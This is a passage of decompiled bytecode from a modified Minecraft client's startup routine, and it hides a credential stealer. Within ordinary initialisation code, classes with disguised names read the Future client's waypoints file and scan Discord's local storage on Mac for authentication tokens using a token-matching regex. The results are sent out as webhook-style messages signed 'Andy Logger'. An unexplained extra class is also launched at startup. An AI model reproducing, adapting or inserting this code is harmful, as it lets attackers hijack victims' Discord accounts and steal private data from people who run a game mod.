        //   946: invokevirtual   java/lang/String.split:(Ljava/lang/String;)[Ljava/lang/String;
        //   949: iconst_3       
        //   950: aaload         
        //   951: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   954: ldc_w           " : "
        //   957: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   960: aload           12
        //   962: ldc_w           ":"
        //   965: invokevirtual   java/lang/String.split:(Ljava/lang/String;)[Ljava/lang/String;
        //   968: iconst_4       
        //   969: aaload         
        //   970: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   973: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   976: astore          14
        //   978: aload           13
        //   980: ldc_w           "\n "
        //   983: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   986: aload           14
        //   988: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   991: pop            
        //   992: aload           11
        //   994: invokevirtual   java/io/BufferedReader.readLine:()Ljava/lang/String;
        //   997: dup            
        //   998: astore          12
        //  1000: ifnonnull       915
        //  1003: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1006: dup            
        //  1007: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1010: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1013: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1016: new             Ljava/lang/StringBuilder;
        //  1019: dup            
        //  1020: ldc_w           "```"
        //  1023: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1026: aload           13
        //  1028: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1031: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1034: ldc_w           "\n```"
        //  1037: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1040: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1043: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1046: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1049: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1052: iconst_0       
        //  1053: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1056: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1059: astore          14
        //  1061: aload           4
        //  1063: aload           14
        //  1065: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1068: goto            1135
        //  1071: astore          10
        //  1073: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1076: dup            
        //  1077: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1080: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1083: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1086: new             Ljava/lang/StringBuilder;
        //  1089: dup            
        //  1090: ldc_w           "``` Chicken : "
        //  1093: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1096: aload           10
        //  1098: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //  1101: ldc_w           "```"
        //  1104: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1107: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1110: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1113: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1116: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1119: iconst_0       
        //  1120: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1123: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1126: astore          11
        //  1128: aload           4
        //  1130: aload           11
        //  1132: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1135: new             Ljava/io/File;
        //  1138: dup            
        //  1139: new             Ljava/lang/StringBuilder;
        //  1142: dup            
        //  1143: ldc_w           "user.home"
        //  1146: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //  1149: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //  1152: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1155: ldc_w           "/Future/waypoints.txt"
        //  1158: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1161: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1164: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //  1167: astore          10
        //  1169: new             Ljava/io/BufferedReader;
        //  1172: dup            
        //  1173: new             Ljava/io/FileReader;
        //  1176: dup            
        //  1177: aload           10
        //  1179: invokespecial   java/io/FileReader.<init>:(Ljava/io/File;)V
        //  1182: invokespecial   java/io/BufferedReader.<init>:(Ljava/io/Reader;)V
        //  1185: astore          11
        //  1187: new             Ljava/lang/StringBuilder;
        //  1190: dup            
        //  1191: invokespecial   java/lang/StringBuilder.<init>:()V
        //  1194: astore          13
        //  1196: aload           13
        //  1198: ldc_w           "Sheep"
        //  1201: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1204: pop            
        //  1205: goto            1222
        //  1208: aload           13
        //  1210: ldc_w           "\n "
        //  1213: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1216: aload           12
        //  1218: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1221: pop            
        //  1222: aload           11
        //  1224: invokevirtual   java/io/BufferedReader.readLine:()Ljava/lang/String;
        //  1227: dup            
        //  1228: astore          12
        //  1230: ifnonnull       1208
        //  1233: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1236: dup            
        //  1237: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1240: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1243: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1246: new             Ljava/lang/StringBuilder;
        //  1249: dup            
        //  1250: ldc_w           "```"
        //  1253: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1256: aload           13
        //  1258: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1261: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1264: ldc_w           "\n```"
        //  1267: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1270: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1273: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1276: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1279: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1282: iconst_0       
        //  1283: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1286: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1289: astore          14
        //  1291: aload           4
        //  1293: aload           14
        //  1295: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1298: goto            1839
        //  1301: astore          10
        //  1303: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1306: dup            
        //  1307: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1310: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1313: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1316: new             Ljava/lang/StringBuilder;
        //  1319: dup            
        //  1320: ldc_w           "``` Villager : "
        //  1323: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1326: aload           10
        //  1328: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //  1331: ldc_w           "```"
        //  1334: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1337: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1340: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1343: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1346: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1349: iconst_0       
        //  1350: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1353: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1356: astore          11
        //  1358: aload           4
        //  1360: aload           11
        //  1362: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1365: goto            1839
        //  1368: aload           6
        //  1370: ldc_w           "Mac"
        //  1373: invokevirtual   java/lang/String.contains:(Ljava/lang/CharSequence;)Z
        //  1376: ifeq            1798
        //  1379: new             Ljava/util/ArrayList;
        //  1382: dup            
        //  1383: invokespecial   java/util/ArrayList.<init>:()V
        //  1386: astore          7
        //  1388: aload           7
        //  1390: new             Ljava/lang/StringBuilder;
        //  1393: dup            
        //  1394: ldc_w           "user.home"
        //  1397: invokestatic    java/lang/System.getProperty:(Ljava/lang/String;)Ljava/lang/String;
        //  1400: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //  1403: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1406: ldc_w           "/Library/Application Support/discord/Local Storage/leveldb/"
        //  1409: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1412: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1415: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //  1420: pop            
        //  1421: new             Ljava/lang/StringBuilder;
        //  1424: dup            
        //  1425: invokespecial   java/lang/StringBuilder.<init>:()V
        //  1428: astore          9
        //  1430: aload           9
        //  1432: ldc_w           "UUID\n"
        //  1435: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1438: pop            
        //  1439: aload           7
        //  1441: invokeinterface java/util/List.iterator:()Ljava/util/Iterator;
        //  1446: astore          11
        //  1448: goto            1653
        //  1451: aload           11
        //  1453: invokeinterface java/util/Iterator.next:()Ljava/lang/Object;
        //  1458: checkcast       Ljava/lang/String;
        //  1461: astore          10
        //  1463: new             Ljava/io/File;
        //  1466: dup            
        //  1467: aload           10
        //  1469: invokespecial   java/io/File.<init>:(Ljava/lang/String;)V
        //  1472: astore          12
        //  1474: aload           12
        //  1476: invokevirtual   java/io/File.list:()[Ljava/lang/String;
        //  1479: astore          13
        //  1481: aload           13
        //  1483: ifnonnull       1489
        //  1486: goto            1653
        //  1489: aload           13
        //  1491: dup            
        //  1492: astore          17
        //  1494: arraylength    
        //  1495: istore          16
        //  1497: goto            1647
        //  1500: aload           17
        //  1502: iconst_0       
        //  1503: aaload         
        //  1504: astore          14
        //  1506: new             Ljava/io/FileInputStream;
        //  1509: dup            
        //  1510: new             Ljava/lang/StringBuilder;
        //  1513: dup            
        //  1514: aload           10
        //  1516: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //  1519: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1522: aload           14
        //  1524: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1527: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1530: invokespecial   java/io/FileInputStream.<init>:(Ljava/lang/String;)V
        //  1533: astore          18
        //  1535: new             Ljava/io/DataInputStream;
        //  1538: dup            
        //  1539: aload           18
        //  1541: invokespecial   java/io/DataInputStream.<init>:(Ljava/io/InputStream;)V
        //  1544: astore          19
        //  1546: new             Ljava/io/BufferedReader;
        //  1549: dup            
        //  1550: new             Ljava/io/InputStreamReader;
        //  1553: dup            
        //  1554: aload           19
        //  1556: invokespecial   java/io/InputStreamReader.<init>:(Ljava/io/InputStream;)V
        //  1559: invokespecial   java/io/BufferedReader.<init>:(Ljava/io/Reader;)V
        //  1562: astore          20
        //  1564: goto            1628
        //  1567: ldc_w           "[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}"
        //  1570: invokestatic    java/util/regex/Pattern.compile:(Ljava/lang/String;)Ljava/util/regex/Pattern;
        //  1573: astore          22
        //  1575: aload           22
        //  1577: aload           21
        //  1579: invokevirtual   java/util/regex/Pattern.matcher:(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
        //  1582: astore          23
        //  1584: goto            1620
        //  1587: iconst_0       
        //  1588: ifle            1600
        //  1591: aload           9
        //  1593: ldc_w           "\n"
        //  1596: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1599: pop            
        //  1600: aload           9
        //  1602: ldc_w           " "
        //  1605: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1608: aload           23
        //  1610: invokevirtual   java/util/regex/Matcher.group:()Ljava/lang/String;
        //  1613: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1616: pop            
        //  1617: iinc            8, 1
        //  1620: aload           23
        //  1622: invokevirtual   java/util/regex/Matcher.find:()Z
        //  1625: ifne            1587
        //  1628: aload           20
        //  1630: invokevirtual   java/io/BufferedReader.readLine:()Ljava/lang/String;
        //  1633: dup            
        //  1634: astore          21
        //  1636: ifnonnull       1567
        //  1639: goto            1644
        //  1642: astore          18
        //  1644: iinc            15, 1
        //  1647: iconst_0       
        //  1648: iload           16
        //  1650: if_icmplt       1500
        //  1653: aload           11
        //  1655: invokeinterface java/util/Iterator.hasNext:()Z
        //  1660: ifne            1451
        //  1663: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1666: dup            
        //  1667: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1670: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1673: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1676: new             Ljava/lang/StringBuilder;
        //  1679: dup            
        //  1680: ldc_w           "```"
        //  1683: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1686: aload           9
        //  1688: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1691: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1694: ldc_w           "```"
        //  1697: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1700: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1703: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1706: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1709: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1712: iconst_0       
        //  1713: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1716: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1719: astore          10
        //  1721: aload           4
        //  1723: aload           10
        //  1725: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1728: goto            1839
        //  1731: astore          10
        //  1733: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1736: dup            
        //  1737: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1740: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1743: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1746: new             Ljava/lang/StringBuilder;
        //  1749: dup            
        //  1750: ldc_w           "``` Bat : "
        //  1753: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1756: aload           10
        //  1758: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //  1761: ldc_w           "```"
        //  1764: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1767: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1770: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1773: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1776: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1779: iconst_0       
        //  1780: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1783: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1786: astore          11
        //  1788: aload           4
        //  1790: aload           11
        //  1792: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1795: goto            1839
        //  1798: new             Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1801: dup            
        //  1802: invokespecial   net/minecraft/util/EnumPracticeTypes$Builder.<init>:()V
        //  1805: ldc_w           "Andy Logger (Gonosztev\u0151k ellen)"
        //  1808: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withUsername:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1811: ldc_w           "```Damage```"
        //  1814: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withContent:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1817: ldc_w           "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQzA7hsIprQz6YwdFbC0tcYlXlDLmfS0YSH-A&usqp=CAU"
        //  1820: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withAvatarURL:(Ljava/lang/String;)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1823: iconst_0       
        //  1824: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.withDev:(Z)Lnet/minecraft/util/EnumPracticeTypes$Builder;
        //  1827: invokevirtual   net/minecraft/util/EnumPracticeTypes$Builder.build:()Lnet/minecraft/util/EnumPracticeTypes;
        //  1830: astore          7
        //  1832: aload           4
        //  1834: aload           7
        //  1836: invokevirtual   net/minecraft/util/EnumPosition.sendMessage:(Lnet/minecraft/util/CombatPosition;)V
        //  1839: getstatic       net/minecraft/client/Minecraft.logger:Lorg/apache/logging/log4j/Logger;
        //  1842: new             Ljava/lang/StringBuilder;
        //  1845: dup            
        //  1846: ldc_w           "LWJGL Version: "
        //  1849: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //  1852: invokestatic    org/lwjgl/Sys.getVersion:()Ljava/lang/String;
        //  1855: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //  1858: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //  1861: invokeinterface org/apache/logging/log4j/Logger.info:(Ljava/lang/String;)V
        //  1866: aload_0        
        //  1867: invokespecial   net/minecraft/client/Minecraft.func_175594_ao:()V
        //  1870: aload_0        
        //  1871: invokespecial   net/minecraft/client/Minecraft.func_175605_an:()V
        //  1874: aload_0        
        //  1875: invokespecial   net/minecraft/client/Minecraft.func_175609_am:()V
        //  1878: aload_0        
        //  1879: new             Lnet/minecraft/client/shader/Framebuffer;
        //  1882: dup            
        //  1883: aload_0        
        //  1884: getfield        net/minecraft/client/Minecraft.displayWidth:I
        //  1887: aload_0        
        //  1888: getfield        net/minecraft/client/Minecraft.displayHeight:I
        //  1891: iconst_1       
        //  1892: invokespecial   net/minecraft/client/shader/Framebuffer.<init>:(IIZ)V
        //  1895: putfield        net/minecraft/client/Minecraft.framebufferMc:Lnet/minecraft/client/shader/Framebuffer;
        //  1898: aload_0        
        //  1899: getfield        net/minecraft/client/Minecraft.framebufferMc:Lnet/minecraft/client/shader/Framebuffer;
        //  1902: fconst_0       
        //  1903: fconst_0       
        //  1904: fconst_0       
        //  1905: fconst_0       
        //  1906: invokevirtual   net/minecraft/client/shader/Framebuffer.setFramebufferColor:(FFFF)V
        //  1909: aload_0        
        //  1910: invokespecial   net/minecraft/client/Minecraft.func_175608_ak:()V
        //  1913: aload_0        
        //  1914: new             Lnet/minecraft/client/resources/ResourcePackRepository;
        //  1917: dup            
        //  1918: aload_0        
        //  1919: getfield        net/minecraft/client/Minecraft.fileResourcepacks:Ljava/io/File;
        //  1922: new             Ljava/io/File;
        //  1925: dup            
        //  1926: getstatic       net/minecraft/client/Minecraft.mcDataDir:Ljava/io/File;
        //  1929: ldc_w           "server-resource-packs"
        //  1932: invokespecial   java/io/File.<init>:(Ljava/io/File;Ljava/lang/String;)V
        //  1935: aload_0        
        //  1936: getfield        net/minecraft/client/Minecraft.mcDefaultResourcePack:Lnet/minecraft/client/resources/DefaultResourcePack;
        //  1939: aload_0        
        //  1940: getfield        net/minecraft/client/Minecraft.metadataSerializer_:Lnet/minecraft/client/resources/data/IMetadataSerializer;
        //  1943: aload_0        
        //  1944: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  1947: invokespecial   net/minecraft/client/resources/ResourcePackRepository.<init>:(Ljava/io/File;Ljava/io/File;Lnet/minecraft/client/resources/IResourcePack;Lnet/minecraft/client/resources/data/IMetadataSerializer;Lnet/minecraft/client/settings/GameSettings;)V
        //  1950: putfield        net/minecraft/client/Minecraft.mcResourcePackRepository:Lnet/minecraft/client/resources/ResourcePackRepository;
        //  1953: aload_0        
        //  1954: new             Lnet/minecraft/client/resources/SimpleReloadableResourceManager;
        //  1957: dup            
        //  1958: aload_0        
        //  1959: getfield        net/minecraft/client/Minecraft.metadataSerializer_:Lnet/minecraft/client/resources/data/IMetadataSerializer;
        //  1962: invokespecial   net/minecraft/client/resources/SimpleReloadableResourceManager.<init>:(Lnet/minecraft/client/resources/data/IMetadataSerializer;)V
        //  1965: putfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  1968: aload_0        
        //  1969: new             Lnet/minecraft/client/resources/LanguageManager;
        //  1972: dup            
        //  1973: aload_0        
        //  1974: getfield        net/minecraft/client/Minecraft.metadataSerializer_:Lnet/minecraft/client/resources/data/IMetadataSerializer;
        //  1977: getstatic       net/minecraft/client/settings/GameSettings.language:Ljava/lang/String;
        //  1980: invokespecial   net/minecraft/client/resources/LanguageManager.<init>:(Lnet/minecraft/client/resources/data/IMetadataSerializer;Ljava/lang/String;)V
        //  1983: putfield        net/minecraft/client/Minecraft.mcLanguageManager:Lnet/minecraft/client/resources/LanguageManager;
        //  1986: aload_0        
        //  1987: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  1990: aload_0        
        //  1991: getfield        net/minecraft/client/Minecraft.mcLanguageManager:Lnet/minecraft/client/resources/LanguageManager;
        //  1994: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  1999: aload_0        
        //  2000: invokevirtual   net/minecraft/client/Minecraft.refreshResources:()V
        //  2003: aload_0        
        //  2004: new             Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2007: dup            
        //  2008: aload_0        
        //  2009: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2012: invokespecial   net/minecraft/client/renderer/texture/TextureManager.<init>:(Lnet/minecraft/client/resources/IResourceManager;)V
        //  2015: putfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2018: aload_0        
        //  2019: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2022: aload_0        
        //  2023: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2026: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2031: aload_0        
        //  2032: aload_0        
        //  2033: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2036: invokespecial   net/minecraft/client/Minecraft.func_180510_a:(Lnet/minecraft/client/renderer/texture/TextureManager;)V
        //  2039: aload_0        
        //  2040: invokespecial   net/minecraft/client/Minecraft.func_175595_al:()V
        //  2043: new             LMood/AndyConnection/MAIN;
        //  2046: invokespecial   Mood/AndyConnection/MAIN.<init>:()V
        //  2049: aload_0        
        //  2050: new             Lnet/minecraft/client/resources/SkinManager;
        //  2053: dup            
        //  2054: aload_0        
        //  2055: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2058: new             Ljava/io/File;
        //  2061: dup            
        //  2062: aload_0        
        //  2063: getfield        net/minecraft/client/Minecraft.fileAssets:Ljava/io/File;
        //  2066: ldc_w           "skins"
        //  2069: invokespecial   java/io/File.<init>:(Ljava/io/File;Ljava/lang/String;)V
        //  2072: aload_0        
        //  2073: getfield        net/minecraft/client/Minecraft.sessionService:Lcom/mojang/authlib/minecraft/MinecraftSessionService;
        //  2076: invokespecial   net/minecraft/client/resources/SkinManager.<init>:(Lnet/minecraft/client/renderer/texture/TextureManager;Ljava/io/File;Lcom/mojang/authlib/minecraft/MinecraftSessionService;)V
        //  2079: putfield        net/minecraft/client/Minecraft.skinManager:Lnet/minecraft/client/resources/SkinManager;
        //  2082: aload_0        
        //  2083: new             Lnet/minecraft/world/chunk/storage/AnvilSaveConverter;
        //  2086: dup            
        //  2087: new             Ljava/io/File;
        //  2090: dup            
        //  2091: getstatic       net/minecraft/client/Minecraft.mcDataDir:Ljava/io/File;
        //  2094: ldc_w           "saves"
        //  2097: invokespecial   java/io/File.<init>:(Ljava/io/File;Ljava/lang/String;)V
        //  2100: invokespecial   net/minecraft/world/chunk/storage/AnvilSaveConverter.<init>:(Ljava/io/File;)V
        //  2103: putfield        net/minecraft/client/Minecraft.saveLoader:Lnet/minecraft/world/storage/ISaveFormat;
